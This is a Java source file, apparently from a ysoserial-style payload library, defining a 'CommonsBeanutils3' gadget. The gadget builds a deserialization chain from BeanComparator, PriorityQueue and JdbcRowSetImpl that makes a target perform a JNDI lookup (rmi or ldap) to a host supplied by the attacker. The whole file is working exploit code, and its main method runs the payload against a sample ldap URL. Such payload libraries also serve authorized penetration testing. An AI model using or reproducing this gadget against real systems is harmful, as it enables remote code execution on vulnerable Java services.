@me.gv7.woodpecker.yso.payloads.annotation.PayloadTest(precondition = "isApplicableJavaVersion")
@me.gv7.woodpecker.yso.payloads.annotation.Dependencies({ "commons-beanutils:commons-beanutils:1.8.3", "commons-collections:commons-collections:3.1" })
@me.gv7.woodpecker.yso.payloads.annotation.Authors({ me.gv7.woodpecker.yso.payloads.annotation.Authors.BEIYING })
public class CommonsBeanutils3 implements me.gv7.woodpecker.yso.payloads.ObjectPayload<java.lang.Object> {
	@java.lang.Override
	public java.lang.Object getObject(java.lang.String command) throws java.lang.Exception {
		java.lang.String jndiURL = null;
		if (command.toLowerCase().startsWith(me.gv7.woodpecker.yso.payloads.custom.CustomCommand.COMMAND_JNDI)) {
			jndiURL = command.substring(me.gv7.woodpecker.yso.payloads.custom.CustomCommand.COMMAND_JNDI.length());
		} else {
			throw new java.lang.Exception("Command format is: [rmi|ldap]://host:port/obj");
		}
		org.apache.commons.beanutils.BeanComparator comparator = new org.apache.commons.beanutils.BeanComparator("lowestSetBit");
		com.sun.rowset.JdbcRowSetImpl rs = new com.sun.rowset.JdbcRowSetImpl();
		rs.setDataSourceName(jndiURL);
		rs.setMatchColumn("foo");
		java.util.PriorityQueue queue = new java.util.PriorityQueue(2, comparator);
		queue.add(new java.math.BigInteger("1"));
		queue.add(new java.math.BigInteger("1"));
		me.gv7.woodpecker.yso.payloads.util.Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		java.lang.Object[] queueArray = ((java.lang.Object[]) (me.gv7.woodpecker.yso.payloads.util.Reflections.getFieldValue(queue, "queue")));
		queueArray[0] = rs;
		queueArray[1] = rs;
		return queue;
	}

	public static void main(java.lang.String[] args) throws java.lang.Exception {
		args = new java.lang.String[]{ "jndi:ldap://127.0.0.1:1664/obj" };
		me.gv7.woodpecker.yso.payloads.util.PayloadRunner.run(me.gv7.woodpecker.yso.payloads.CommonsBeanutils3.class, args);
	}
}